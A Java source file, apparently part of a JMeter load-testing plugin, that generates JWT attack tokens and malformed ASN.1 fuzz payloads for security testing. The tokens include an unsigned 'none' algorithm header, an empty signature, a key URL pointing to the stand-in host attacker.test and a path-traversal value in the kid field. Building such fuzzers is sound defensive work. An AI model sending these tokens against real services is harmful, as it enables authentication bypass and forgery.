package com.mockjutsu.jmeter.generators;

import java.security.SecureRandom;
import java.util.Base64;
import java.util.concurrent.ThreadLocalRandom;

/** CryptoFuzz — JWT attack patterns, ASN.1 fuzz payloads. Mirrors crypto_fuzz.py. */
public final class CryptoFuzzGen {
    private CryptoFuzzGen() {}
    private static final SecureRandom SEC = new SecureRandom();

    public static String generate(String type, String locale) {
        ThreadLocalRandom rng = ThreadLocalRandom.current();
        return switch (type) {
            case "jwt_attack"  -> jwtAttack(rng);
            case "asn1_fuzz"   -> asn1Fuzz(rng);
            default -> "ERROR: Unknown crypto fuzz type '" + type + "'";
        };
    }

    private static String jwtAttack(ThreadLocalRandom rng) {
        String[] attacks = {"none_alg", "alg_confusion", "empty_sig", "kid_injection"};
        String attack = attacks[rng.nextInt(attacks.length)];
        String header = switch (attack) {
            case "none_alg"      -> b64url("{\"alg\":\"none\",\"typ\":\"JWT\"}");
            case "alg_confusion" -> b64url("{\"alg\":\"HS256\",\"typ\":\"JWT\",\"x5u\":\"http://attacker.test/key\"}");
            case "kid_injection" -> b64url("{\"alg\":\"HS256\",\"kid\":\"../../dev/null\",\"typ\":\"JWT\"}");
            default              -> b64url("{\"alg\":\"RS256\",\"typ\":\"JWT\"}");
        };
        String payload = b64url("{\"sub\":\"mock_user\",\"iat\":" + (System.currentTimeMillis()/1000) + "}");
        String sig     = attack.equals("empty_sig") ? "" : b64url(new byte[32]);
        return "{\"attack\":\"" + attack + "\",\"token\":\"" + header + "." + payload + "." + sig + "\"}";
    }

    private static String asn1Fuzz(ThreadLocalRandom rng) {
        // Malformed ASN.1 DER payload (for security testing)
        byte[] payload = new byte[32];
        SEC.nextBytes(payload);
        payload[0] = 0x30; // SEQUENCE
        payload[1] = (byte) rng.nextInt(0, 256); // potentially wrong length
        return "{\"type\":\"DER_SEQUENCE\",\"hex\":\"" + bytesToHex(payload) + "\",\"length_fuzzed\":true}";
    }

    private static String b64url(String s) { return Base64.getUrlEncoder().withoutPadding().encodeToString(s.getBytes()); }
    private static String b64url(byte[] b)  { return Base64.getUrlEncoder().withoutPadding().encodeToString(b); }

    private static String bytesToHex(byte[] b) {
        StringBuilder sb = new StringBuilder(b.length * 2);
        for (byte v : b) sb.append(String.format("%02X", v));
        return sb.toString();
    }
}
